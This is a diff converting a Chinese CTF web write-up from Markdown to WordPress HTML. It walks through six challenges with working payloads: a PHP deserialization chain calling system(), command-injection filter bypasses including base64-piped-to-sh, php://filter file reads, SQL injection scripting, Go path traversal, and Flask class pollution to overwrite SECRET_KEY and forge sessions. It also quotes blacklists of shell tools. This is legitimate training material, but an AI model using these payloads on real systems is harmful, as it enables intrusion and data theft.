@@ -1,18 +1,19 @@
 ---
-title: 2025H&NCTF web
+title: 2025H&amp;NCTF web
 date: 2025-06-09 23:32:24
 updated: 2025-09-02 21:31:37
 author: Xebdria
 categories:
   - wp
   - 比赛
+permalink: http://xendria.icu/index.php/2025/06/09/2025hnctf-web/
 ---
+<!-- wp:heading -->
+<h2 class="wp-block-heading">ez_php</h2>
+<!-- /wp:heading -->
 
-{% raw %}
-## ez_php
-
-```php
-<?php
+<!-- wp:code -->
+<pre class="wp-block-code"><code><?php
 error_reporting(0);
 class GOGOGO{
     public $dengchao;
@@ -43,23 +44,27 @@ if (isset($_POST['data'])) {
 } else {
     highlight_file(__FILE__);
 }
-?>
-```
+?></code></pre>
+<!-- /wp:code -->
 
-挺简单的链子，主要就是注意到 throw new Exception('What do you want to do?');，我们需要绕过这个GC回收，然后触发__destruct()方法让链子走下去。还有一个地方就是
+<!-- wp:paragraph -->
+<p>挺简单的链子，主要就是注意到 throw new Exception('What do you want to do?');，我们需要绕过这个GC回收，然后触发__destruct()方法让链子走下去。<br>还有一个地方就是</p>
+<!-- /wp:paragraph -->
 
-```
-function __toString(){
+<!-- wp:code -->
+<pre class="wp-block-code"><code>function __toString(){
         if( ($this->Dagongren != $this->Bagongren) && (md5($this->Dagongren) === md5($this->Bagongren)) && (sha1($this->Dagongren)=== sha1($this->Bagongren)) ){
             call_user_func_array($this->dao, ['诗人我吃！']);
         }
-    }
-```
+    }</code></pre>
+<!-- /wp:code -->
 
-我们直接用数组可以绕过，然后我们就可以开始写了
+<!-- wp:paragraph -->
+<p>我们直接用数组可以绕过，然后我们就可以开始写了</p>
+<!-- /wp:paragraph -->
 
-```php
-<?php
+<!-- wp:code -->
+<pre class="wp-block-code"><code><?php
 error_reporting(0);
 class GOGOGO{
     public $dengchao;
@@ -93,35 +98,55 @@ $b->dao=[$c,"cat /ofl1111111111ove4g"];
 $c->HongCaFei="system";
 $arr = array($a,0);
 echo serialize($arr);
-#a:2:{i:0;O:6:"GOGOGO":1:{s:8:"dengchao";O:6:"DouBao":3:{s:3:"dao";a:2:{i:0;O:8:"HeiCaFei":1:{s:9:"HongCaFei";s:6:"system";}i:1;s:23:"cat /ofl1111111111ove4g";}s:9:"Dagongren";a:1:{i:0;i:1;}s:9:"Bagongren";a:1:{i:0;i:2;}}}i:1;i:0;}
-```
+#a:2:{i:0;O:6:"GOGOGO":1:{s:8:"dengchao";O:6:"DouBao":3:{s:3:"dao";a:2:{i:0;O:8:"HeiCaFei":1:{s:9:"HongCaFei";s:6:"system";}i:1;s:23:"cat /ofl1111111111ove4g";}s:9:"Dagongren";a:1:{i:0;i:1;}s:9:"Bagongren";a:1:{i:0;i:2;}}}i:1;i:0;}</code></pre>
+<!-- /wp:code -->
 
-我们把结果最后面的i:1;i:0;改为i:0;i:0;
+<!-- wp:paragraph -->
+<p>我们把结果最后面的i:1;i:0;改为i:0;i:0;</p>
+<!-- /wp:paragraph -->
 
-```
-data=a:2:{i:0;O:6:"GOGOGO":1:{s:8:"dengchao";O:6:"DouBao":3:{s:3:"dao";a:2:{i:0;O:8:"HeiCaFei":1:{s:9:"HongCaFei";s:6:"system";}i:1;s:23:"cat /ofl1111111111ove4g";}s:9:"Dagongren";a:1:{i:0;i:1;}s:9:"Bagongren";a:1:{i:0;i:2;}}}i:0;i:0;}
-```
+<!-- wp:code -->
+<pre class="wp-block-code"><code>data=a:2:{i:0;O:6:"GOGOGO":1:{s:8:"dengchao";O:6:"DouBao":3:{s:3:"dao";a:2:{i:0;O:8:"HeiCaFei":1:{s:9:"HongCaFei";s:6:"system";}i:1;s:23:"cat /ofl1111111111ove4g";}s:9:"Dagongren";a:1:{i:0;i:1;}s:9:"Bagongren";a:1:{i:0;i:2;}}}i:0;i:0;}</code></pre>
+<!-- /wp:code -->
 
-## DeceptiFlag
+<!-- wp:heading -->
+<h2 class="wp-block-heading">DeceptiFlag</h2>
+<!-- /wp:heading -->
 
-一开始看到这个题解那么少以为挺难的就没去看题目了，刚好停电就睡觉去了...填了xiyangyang和huitailang后没反应，那我们可以试试抓包，抓包可能会给你意想不到的的惊喜
+<!-- wp:paragraph -->
+<p>一开始看到这个题解那么少以为挺难的就没去看题目了，刚好停电就睡觉去了...<br>填了xiyangyang和huitailang后没反应，那我们可以试试抓包，抓包可能会给你意想不到的的惊喜</p>
+<!-- /wp:paragraph -->
 
-![](http://xendria.icu/wp-content/uploads/2025/06/b449b50b-29fd-49cf-94d5-1d05618a9b92.png)
+<!-- wp:image {"id":467,"sizeSlug":"full","linkDestination":"none"} -->
+<figure class="wp-block-image size-full"><img src="http://xendria.icu/wp-content/uploads/2025/06/b449b50b-29fd-49cf-94d5-1d05618a9b92.png" alt="" class="wp-image-467"/></figure>
+<!-- /wp:image -->
 
-额，是填两个...然后呢我们得到了一个返回包，我们注意到这两个地方
+<!-- wp:paragraph -->
+<p>额，是填两个...然后呢我们得到了一个返回包，我们注意到这两个地方</p>
+<!-- /wp:paragraph -->
 
-![](http://xendria.icu/wp-content/uploads/2025/06/ac5de0205ae3ef320d27e5e675356f0a-1024x355.png)
+<!-- wp:image {"id":468,"sizeSlug":"large","linkDestination":"none"} -->
+<figure class="wp-block-image size-large"><img src="http://xendria.icu/wp-content/uploads/2025/06/ac5de0205ae3ef320d27e5e675356f0a-1024x355.png" alt="" class="wp-image-468"/></figure>
+<!-- /wp:image -->
 
-当时比赛没看到tips.php直接全剧终了，我们进去
+<!-- wp:paragraph -->
+<p>当时比赛没看到tips.php直接全剧终了，我们进去</p>
+<!-- /wp:paragraph -->
 
-![](http://xendria.icu/wp-content/uploads/2025/06/de3f86fc0b1327f17601061060f7990c.png)
+<!-- wp:image {"id":469,"sizeSlug":"full","linkDestination":"none"} -->
+<figure class="wp-block-image size-full"><img src="http://xendria.icu/wp-content/uploads/2025/06/de3f86fc0b1327f17601061060f7990c.png" alt="" class="wp-image-469"/></figure>
+<!-- /wp:image -->
 
-看到了file再结合给了flag的目录，我们可以试试伪协议读取?file=php://filter/convert.base64-encode/resource=/var/flag/flag.txt结果还真是这样子...
+<!-- wp:paragraph -->
+<p>看到了file再结合给了flag的目录，我们可以试试伪协议读取<br>?file=php://filter/convert.base64-encode/resource=/var/flag/flag.txt<br>结果还真是这样子...</p>
+<!-- /wp:paragraph -->
 
-## Really_Ez_Rce
+<!-- wp:heading -->
+<h2 class="wp-block-heading">Really_Ez_Rce</h2>
+<!-- /wp:heading -->
 
-```php
-<?php
+<!-- wp:code -->
+<pre class="wp-block-code"><code><?php
 header('Content-Type: text/html; charset=utf-8');
 highlight_file(__FILE__);
 error_reporting(0);
@@ -143,37 +168,44 @@ if (isset($_REQUEST['Number'])) {
                 '/wget|dir|nl|nc|cat|tail|more|flag|sh|cut|awk|strings|od|curl|ping|\\*|sort|zip|mod|sl|find|sed|cp|mv|ty|php|tee|txt|grep|base|fd|df|\\\\|more|cc|tac|less|head|\.|\{|\}|uniq|copy|%|file|xxd|date|\[|\]|flag|bash|env|!|\?|ls|\'|\"|id/i',
                 $cmd
             )) {
-                echo "你传的参数似乎挺正经的,放你过去吧
-";
+                echo "你传的参数似乎挺正经的,放你过去吧<br>";
                 system($cmd);
             } else {
                 echo "nonono,hacker!!!";
             }
         }
     }
-}
-```
+}</code></pre>
+<!-- /wp:code -->
 
-第一层Number直接用数组绕过了  Number[]=1第二层我们看到ban了很多的东西，但是仔细一看会发现=和;和`居然没ban，那我们可以拼接语句了，以及反引号绕过了
+<!-- wp:paragraph -->
+<p>第一层Number直接用数组绕过了  Number[]=1<br>第二层我们看到ban了很多的东西，但是仔细一看会发现=和;和`居然没ban，那我们可以拼接语句了，以及反引号绕过了</p>
+<!-- /wp:paragraph -->
 
-```
-找目录
+<!-- wp:code -->
+<pre class="wp-block-code"><code>找目录
 l``s /
 l$@s /
 然后就是查看
 echo Y2F0IC9mbGFn | base64 -d | sh //用base编码绕过
 cmd=a=ca;b=t;c=se;d=d;e=di;f=r;$a$b /$($e$f -1 / | $c$d -n 5p); //查看第五个的内容就是
-cat /$(dir -1 / | sed -n 5p)//第一次见到这种姿势，学到学到了
-```
+cat /$(dir -1 / | sed -n 5p)//第一次见到这种姿势，学到学到了</code></pre>
+<!-- /wp:code -->
 
-## 半成品login
+<!-- wp:heading -->
+<h2 class="wp-block-heading">半成品login</h2>
+<!-- /wp:heading -->
 
-admin admin123弱密码爆破进入然后发现应该是有个sql注入select,空格等被过滤了
+<!-- wp:paragraph -->
+<p>admin admin123弱密码爆破进入<br>然后发现应该是有个sql注入select,空格等被过滤了</p>
+<!-- /wp:paragraph -->
 
-![](http://xendria.icu/wp-content/uploads/2025/06/3a278bca-52dd-4118-a940-e8f05434f46f-1-1024x602.png)
+<!-- wp:image {"id":484,"sizeSlug":"large","linkDestination":"none"} -->
+<figure class="wp-block-image size-large"><img src="http://xendria.icu/wp-content/uploads/2025/06/3a278bca-52dd-4118-a940-e8f05434f46f-1-1024x602.png" alt="" class="wp-image-484"/></figure>
+<!-- /wp:image -->
 
-```
-先附上官方脚本，利用的是table注入
+<!-- wp:code -->
+<pre class="wp-block-code"><code>先附上官方脚本，利用的是table注入
 import requests
 import time
 
@@ -257,27 +289,43 @@ for i in range(1, 15):
             print(f"当前结果: {flag}")
             break
 
-print(f"最终结果: {flag}")
-```
+print(f"最终结果: {flag}")</code></pre>
+<!-- /wp:code -->
 
-## Watch
+<!-- wp:heading -->
+<h2 class="wp-block-heading">Watch</h2>
+<!-- /wp:heading -->
 
-看到提示注意go版本和路径形式，然后我们在所给的文件go.mod发现是go 1.2根据给的信息找到了CVE-2023-45283
+<!-- wp:paragraph -->
+<p>看到提示注意go版本和路径形式，然后我们在所给的文件go.mod发现是go 1.2<br>根据给的信息找到了CVE-2023-45283<br></p>
+<!-- /wp:paragraph -->
 
-![](http://xendria.icu/wp-content/uploads/2025/06/2921507d-4850-4dce-a963-f7c89edb5ca6-1024x635.png)
+<!-- wp:image {"id":471,"sizeSlug":"large","linkDestination":"none"} -->
+<figure class="wp-block-image size-large"><img src="http://xendria.icu/wp-content/uploads/2025/06/2921507d-4850-4dce-a963-f7c89edb5ca6-1024x635.png" alt="" class="wp-image-471"/></figure>
+<!-- /wp:image -->
 
-我们可以加个目录超越..\??\c:\来找他的c盘，发现都是空的，我们找找别的盘
+<!-- wp:paragraph -->
+<p>我们可以加个目录超越..\??\c:\来找他的c盘，发现都是空的，我们找找别的盘</p>
+<!-- /wp:paragraph -->
 
-![](http://xendria.icu/wp-content/uploads/2025/06/7f569351-5b1d-4cac-929d-20ee98ee5ba5-1024x290.png)
+<!-- wp:image {"id":472,"sizeSlug":"large","linkDestination":"none"} -->
+<figure class="wp-block-image size-large"><img src="http://xendria.icu/wp-content/uploads/2025/06/7f569351-5b1d-4cac-929d-20ee98ee5ba5-1024x290.png" alt="" class="wp-image-472"/></figure>
+<!-- /wp:image -->
 
-../??/d:/key.txt 获得key提交获得flag
+<!-- wp:paragraph -->
+<p>../??/d:/key.txt 获得key提交获得flag</p>
+<!-- /wp:paragraph -->
 
-## 奇怪的咖啡店
+<!-- wp:heading -->
+<h2 class="wp-block-heading">奇怪的咖啡店</h2>
+<!-- /wp:heading -->
 
-给的页面没什么东西，题目给了部分源码，那我们看看源码
+<!-- wp:paragraph -->
+<p>给的页面没什么东西，题目给了部分源码，那我们看看源码</p>
+<!-- /wp:paragraph -->
 
-```
-from flask import Flask, session, request, render_template_string, render_template
+<!-- wp:code -->
+<pre class="wp-block-code"><code>from flask import Flask, session, request, render_template_string, render_template
 import json
 import os
 
@@ -307,8 +355,10 @@ def store():
                          session=session,
                          products=products)
 
+
 def add():
     pass
+
 
 @app.route('/add', methods=['POST', 'GET'])
 def adddd():
@@ -364,6 +414,8 @@ def adddd():
             except Exception as e:
                 return f"添加失败4"
         return "添加失败5"
+
+
 
 def merge(src, dst):
     for k, v in src.items():
@@ -377,35 +429,47 @@ def merge(src, dst):
         else:
             setattr(dst, k, v)
 
-app.run(host="0.0.0.0",port=5014)
-```
 
-我们喂ai，它说有个明显的原型链污染存在于/add路由
 
-```
-merge(json_data, add)//这个是污染点
-```
+app.run(host="0.0.0.0",port=5014)</code></pre>
+<!-- /wp:code -->
 
-那我们就能去污染他来个任意文件读取？
+<!-- wp:paragraph -->
+<p>我们喂ai，它说有个明显的原型链污染存在于/add路由</p>
+<!-- /wp:paragraph -->
 
-```
-{
+<!-- wp:code -->
+<pre class="wp-block-code"><code>merge(json_data, add)//这个是污染点</code></pre>
+<!-- /wp:code -->
+
+<!-- wp:paragraph -->
+<p>那我们就能去污染他来个任意文件读取？</p>
+<!-- /wp:paragraph -->
+
+<!-- wp:code -->
+<pre class="wp-block-code"><code>{
   "__globals__": {
     "app": {
       "_static_folder": "/"
     }
   }
-}
-```
+}</code></pre>
+<!-- /wp:code -->
 
-然后发现回显的不是 你无法添加商品哦而是添加失败5，应该是被过滤了，我们能用unicode编码绕过
+<!-- wp:paragraph -->
+<p>然后发现回显的不是 你无法添加商品哦而是添加失败5，应该是被过滤了，我们能用unicode编码绕过</p>
+<!-- /wp:paragraph -->
 
-![](http://xendria.icu/wp-content/uploads/2025/06/2a81a52a-6556-4977-a707-d11e69299af2-1024x551.png)
+<!-- wp:image {"id":473,"sizeSlug":"large","linkDestination":"none"} -->
+<figure class="wp-block-image size-large"><img src="http://xendria.icu/wp-content/uploads/2025/06/2a81a52a-6556-4977-a707-d11e69299af2-1024x551.png" alt="" class="wp-image-473"/></figure>
+<!-- /wp:image -->
 
-我们查看源码/static/app/app.py
+<!-- wp:paragraph -->
+<p>我们查看源码/static/app/app.py</p>
+<!-- /wp:paragraph -->
 
-```
-from flask import Flask, session, request, render_template_string, render_template
+<!-- wp:code -->
+<pre class="wp-block-code"><code>from flask import Flask, session, request, render_template_string, render_template
 import json
 import os
 
@@ -435,8 +499,10 @@ def store():
                          session=session,
                          products=products)
 
+
 def add():
     pass
+
 
 @app.route('/add', methods=['POST', 'GET'])
 def adddd():
@@ -492,6 +558,7 @@ def adddd():
             except Exception as e:
                 return f"添加失败4"
         return "添加失败5"
+
 
 @app.route('/aaadminnn', methods=['GET', 'POST'])
 def admin():
@@ -508,10 +575,8 @@ def admin():
         <h2>商品管理系统</h2>
         <form method=POST enctype=multipart/form-data style="margin:20px;padding:20px;border:1px solid #ccc">
             <h3>上传新商品</h3>
-            <input type=file name=file required style="margin:10px">
-
-            <small>支持格式：jpg/png（最大2MB）</small>
-
+            <input type=file name=file required style="margin:10px"><br>
+            <small>支持格式：jpg/png（最大2MB）</small><br>
             <input type=submit value="立即上传" style="margin:10px;padding:5px 20px">
         </form>
         '''
@@ -522,6 +587,9 @@ def admin():
         return render_template_string(new_template)
     else:
         return "<script>alert('You are not an admin');window.location.href='/'</script>"
+
+
+
 
 def merge(src, dst):
     for k, v in src.items():
@@ -535,6 +603,7 @@ def merge(src, dst):
         else:
             setattr(dst, k, v)
 
+
 def check(raw_data, forbidden_keywords=None):
     """
     检查原始数据中是否包含禁止的关键词
@@ -547,9 +616,11 @@ def check(raw_data, forbidden_keywords=None):
     # 检查是否包含任何禁止关键词
     return any(keyword in raw_data for keyword in forbidden_keywords)
 
+
 param_black_list = ['config', 'session', 'url', '\\', '<', '>', '%1c', '%1d', '%1f', '%1e', '%20', '%2b', '%2c', '%3c', '%3e', '%c', '%2f',
                     'b64decode', 'base64', 'encode', 'chr', '[', ']', 'os', 'cat',  'flag',  'set',  'self', '%', 'file',  'pop(',
                     'setdefault', 'char', 'lipsum', 'update', '=', 'if', 'print', 'env', 'endfor', 'code', '=' ]
+
 
 # 增强WAF防护
 def waf_check(value):
@@ -578,27 +649,34 @@ def check1(value):
 
     return False
 
-app.run(host="0.0.0.0",port=5014)
-```
 
-多了个/aaadminnn路由，然后看他的waf就应该差不多能猜出来要打ssti
+app.run(host="0.0.0.0",port=5014)</code></pre>
+<!-- /wp:code -->
 
-我们可以先在/add界面继续污染，把他过滤的param_black_list给污染了（当然相同的都需要Unicode编码{"__globals__" : {"param_black_list" : ["123"]}}/aaadminnn路由的话看到只有session这个点可以注，然后session有两个参数
+<!-- wp:paragraph -->
+<p>多了个/aaadminnn路由，然后看他的waf就应该差不多能猜出来要打ssti</p>
+<!-- /wp:paragraph -->
 
-```
-@app.route('/aaadminnn', methods=['GET', 'POST'])
+<!-- wp:paragraph -->
+<p>我们可以先在/add界面继续污染，把他过滤的param_black_list给污染了（当然相同的都需要Unicode编码<br>{"__globals__" : {"param_black_list" : ["123"]}}<br>/aaadminnn路由的话看到只有session这个点可以注，然后session有两个参数</p>
+<!-- /wp:paragraph -->
+
+<!-- wp:code -->
+<pre class="wp-block-code"><code>@app.route('/aaadminnn', methods=['GET', 'POST'])
 def admin():
     if session.get('name') == "admin" and session.get('permission') != 0:
         permission = session.get('permission')
         if check1(permission):
             # 检测添加的商品是否合法
-            return "非法权限"
-```
+            return "非法权限"</code></pre>
+<!-- /wp:code -->
 
-name和permission，但是我们不知道它的key要怎么伪造呢，我们又想到了原型链污染，我们可以把这个随机的key污染成一个我们想要的key，SECRET_KEY 一般存储在 Flask 应用对象的 `config` 属性，那我们就可以写了
+<!-- wp:paragraph -->
+<p>name和permission，但是我们不知道它的key要怎么伪造呢，我们又想到了原型链污染，我们可以把这个随机的key污染成一个我们想要的key，SECRET_KEY 一般存储在 Flask 应用对象的 <code>config</code> 属性，那我们就可以写了</p>
+<!-- /wp:paragraph -->
 
-```
-{"__globals__" : {"app" : {"config" : {"SECRET_KEY":"111"}}}}
+<!-- wp:code -->
+<pre class="wp-block-code"><code>{"__globals__" : {"app" : {"config" : {"SECRET_KEY":"111"}}}}
 污染了后就是ssti了
 
 from flask.sessions import SecureCookieSessionInterface
@@ -618,12 +696,21 @@ session_data = {
 
 serializer = SecureCookieSessionInterface().get_signing_serializer(MockApp())
 cookie_value = serializer.dumps(session_data)
-print(cookie_value)
-```
+print(cookie_value)</code></pre>
+<!-- /wp:code -->
 
-去/aaadminnn改session就行了参考自晨曦师傅的wp[https://chenxi9981.github.io/2025H&NCTF_WP/](https://chenxi9981.github.io/2025H&NCTF_WP/)
+<!-- wp:paragraph -->
+<p>去/aaadminnn改session就行了<br>参考自晨曦师傅的wp<a href="https://chenxi9981.github.io/2025H&NCTF_WP/">https://chenxi9981.github.io/2025H&NCTF_WP/</a></p>
+<!-- /wp:paragraph -->
 
-## 小结
+<!-- wp:paragraph -->
+<p></p>
+<!-- /wp:paragraph -->
 
-还没写完....
-{% endraw %}
+<!-- wp:heading -->
+<h2 class="wp-block-heading">小结</h2>
+<!-- /wp:heading -->
+
+<!-- wp:paragraph -->
+<p>还没写完....</p>
+<!-- /wp:paragraph -->
